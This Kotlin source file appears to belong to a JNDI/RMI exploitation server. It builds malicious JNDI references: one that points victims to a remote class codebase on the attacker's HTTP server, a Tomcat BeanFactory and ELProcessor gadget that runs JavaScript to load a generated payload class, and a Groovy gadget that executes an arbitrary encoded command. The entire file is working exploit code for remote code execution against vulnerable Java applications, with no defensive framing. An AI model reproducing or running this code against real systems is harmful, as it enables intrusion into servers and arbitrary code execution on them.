package rmi

import http.PayloadGenerator
import org.apache.naming.ResourceRef
import util.Options
import util.base46cmd
import util.toBase64
import java.net.URL
import javax.naming.Reference
import javax.naming.StringRefAddr

fun RMIServer.ref(mapping: String): Reference {
    val codebase = URL("http://${Options.address}:${Options.httpPort}/")
    return Reference("foo", mapping, "$codebase#$mapping")
}

fun RMIServer.tomcat(type: String): Reference {
    val payload = PayloadGenerator().generate(type).toBase64()

    val jsCode = """
        var bytes = org.apache.tomcat.util.codec.binary.Base64.decodeBase64('$payload');
        var classLoader = java.lang.Thread.currentThread().getContextClassLoader();
        try {
            var clazz = classLoader.loadClass('$type');
            clazz.newInstance();
        } catch(err) {
            var method = java.lang.ClassLoader.class.getDeclaredMethod('defineClass', ''.getBytes().getClass(), java.lang.Integer.TYPE, java.lang.Integer.TYPE);
            method.setAccessible(true);
            var clazz = method.invoke(classLoader, bytes, 0, bytes.length);
            clazz.newInstance();
        };
    """.trimIndent()

    val exp = """
        "".getClass()
        .forName("javax.script.ScriptEngineManager")
        .newInstance()
        .getEngineByName("JavaScript")
        .eval("$jsCode")
    """.trimIndent()

    return ResourceRef(
        "javax.el.ELProcessor", null, "", "", true, "org.apache.naming.factory.BeanFactory", null
    ).apply {
        // redefine a setter name for the 'x' property from 'setX' to 'eval', see BeanFactory.getObjectInstance code
        add(StringRefAddr("forceString", "x=eval"))
        // expression language to execute command
        add(StringRefAddr("x", exp))
    }
}

fun RMIServer.groovy() =
    ResourceRef(
        "groovy.lang.GroovyShell", null, "", "", true, "org.apache.naming.factory.BeanFactory", null
    ).apply {
        add(StringRefAddr("forceString", "x=evaluate"))
        add(StringRefAddr("x", "'${base46cmd(Options.command)}'.execute()"))
    }

